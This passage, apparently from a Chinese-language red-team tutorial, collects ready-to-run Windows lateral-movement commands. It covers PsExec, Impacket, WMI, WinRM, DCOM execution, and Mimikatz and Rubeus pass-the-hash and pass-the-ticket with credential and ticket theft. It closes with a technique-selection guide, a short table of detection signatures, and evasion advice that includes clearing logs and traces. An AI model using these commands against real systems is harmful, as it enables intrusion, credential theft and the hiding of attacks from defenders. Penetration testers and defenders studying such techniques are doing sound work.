## 六、代码汇总

### 6.1 PsExec

```bash
# Sysinternals PsExec
psexec.exe \\target -u domain\user -p password cmd.exe
psexec.exe \\target -u domain\user -p password -s cmd.exe  # SYSTEM 权限
psexec.exe \\target -u domain\user -p password -c payload.exe  # 上传并执行

# Impacket psexec.py
psexec.py domain/user:password@target
psexec.py -hashes :ntlmhash domain/user@target

# Impacket smbexec.py (不上传文件)
smbexec.py domain/user:password@target
```

### 6.2 WMI

```powershell
# PowerShell
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\output.txt" -ComputerName target -Credential $cred

# wmic 命令
wmic /node:target /user:domain\user /password:password process call create "cmd.exe /c whoami"

# Impacket wmiexec.py
wmiexec.py domain/user:password@target
wmiexec.py -hashes :ntlmhash domain/user@target
```

### 6.3 WinRM

```powershell
# 启用 WinRM (目标机器)
Enable-PSRemoting -Force

# 远程执行命令
$cred = Get-Credential
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock { whoami }

# 交互式会话
Enter-PSSession -ComputerName target -Credential $cred

# 执行脚本
Invoke-Command -ComputerName target -Credential $cred -FilePath C:\script.ps1

# 多台机器
Invoke-Command -ComputerName target1,target2,target3 -Credential $cred -ScriptBlock { whoami }

# Impacket
evil-winrm -i target -u user -p password
```

### 6.4 DCOM

```powershell
# 使用 MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "target"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")

# 使用 ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "target"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)

# 使用 ShellBrowserWindow
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "target"))
$com.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)
```

### 6.5 Pass-the-Hash

```
# Mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:hash /run:cmd.exe

# Impacket
psexec.py -hashes :ntlmhash domain/user@target
wmiexec.py -hashes :ntlmhash domain/user@target
smbexec.py -hashes :ntlmhash domain/user@target

# CrackMapExec
crackmapexec smb target -u user -H ntlmhash
crackmapexec smb target -u user -H ntlmhash -x "whoami"
```

### 6.6 Pass-the-Ticket

```
# 导出票据
mimikatz # sekurlsa::tickets /export

# 导入票据
mimikatz # kerberos::ptt ticket.kirbi

# 使用 Rubeus
Rubeus.exe ptt /ticket:base64_ticket

# 验证
klist
dir \\target\c$
```

### 6.7 Overpass-the-Hash

```
# 使用 NTLM 哈希请求 TGT
mimikatz # sekurlsa::pth /user:user /domain:corp.com /ntlm:hash /run:powershell.exe

# 在新窗口中
klist  # 查看票据
dir \\dc01\c$  # 触发 Kerberos 认证

# 使用 Rubeus
Rubeus.exe asktgt /user:user /rc4:ntlmhash /ptt
```

## 七、实战经验总结

### 7.1 横向移动方法选择

```
选择建议:

需要交互式 Shell:
├── WinRM (PowerShell Remoting)
├── PsExec
└── evil-winrm

只需执行命令:
├── WMI
├── DCOM
└── Scheduled Tasks

需要隐蔽:
├── WMI (不上传文件)
├── DCOM
└── WinRM

有 NTLM 哈希:
├── Pass-the-Hash
└── Overpass-the-Hash

有 Kerberos 票据:
└── Pass-the-Ticket
```

### 7.2 检测特征

| 技术 | 检测特征 |
|------|----------|
| PsExec | 服务创建、文件上传、事件 7045 |
| WMI | WMI 事件、进程创建 |
| WinRM | 端口 5985/5986、PowerShell 日志 |
| DCOM | DCOM 事件、异常进程父子关系 |
| PTH | 事件 4624 (Type 3)、异常登录 |

### 7.3 规避建议

```
规避策略:
1. 使用不上传文件的方法 (WMI, DCOM)
2. 使用合法管理工具
3. 在正常工作时间执行
4. 使用加密通道
5. 清理日志和痕迹
6. 使用 Kerberos 而非 NTLM
```
